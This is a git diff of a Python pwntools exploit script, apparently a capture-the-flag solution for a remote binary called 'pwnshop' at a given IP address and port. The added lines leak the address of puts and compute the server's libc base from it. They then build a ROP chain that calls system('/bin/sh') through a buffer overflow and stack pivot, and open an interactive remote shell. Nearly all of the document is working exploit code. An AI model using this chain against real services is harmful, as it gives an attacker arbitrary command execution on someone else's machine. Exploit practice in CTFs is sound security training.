@@ -5,8 +5,11 @@ context.log_level = 'debug'
 
 elf = ELF('./pwnshop')
 
+#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 #io = process('./pwnshop')
 #io = gdb.debug('./pwnshop', 'break main')
+
+libc = ELF('./libc6_2.23-0ubuntu11.2_amd64.so')
 ip, port = '165.232.104.184', 30745
 io = remote(ip, port)
 
@@ -26,6 +29,7 @@ pop_rdi_ret = elf_base + 0x00000000000013c3
 got_puts = elf_base + elf.got.puts
 plt_puts = elf_base + 0x1030
 ret = elf_base + 0x132a
+#main = elf_base + 0x10a0
 
 io.sendlineafter('>', '1')
 padding = 'A'*(72-0x28+8)
@@ -41,4 +45,28 @@ buf = io.recvline().strip()
 
 print hex(u64(buf.ljust(8,'\x00')))
 #get puts address and search in https://libc.blukat.me/
+print hex(libc.symbols['puts'])
 
+puts_addr = u64(buf.ljust(8,'\x00'))
+server_libc_base = puts_addr - libc.symbols['puts']
+log.info("Leaked server's libc base address: "+hex(server_libc_base))
+
+libc.address = server_libc_base
+
+#rop_libc.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])
+padding = 'A'*(72-0x28+8)
+payload = padding
+payload += p64(pop_rdi_ret)
+print hex(pop_rdi_ret)
+bash_addr = next(libc.search(b'/bin/sh\x00'))
+payload += p64(bash_addr)
+print hex(bash_addr)
+payload += p64(libc.symbols['system'])
+print hex(libc.symbols['system'])
+payload += p64(ret)
+payload += 'A'*(0x28-4*8-8)
+payload += p64(stack_pivot)
+
+io.sendafter('Enter details:', payload)
+
+io.interactive()
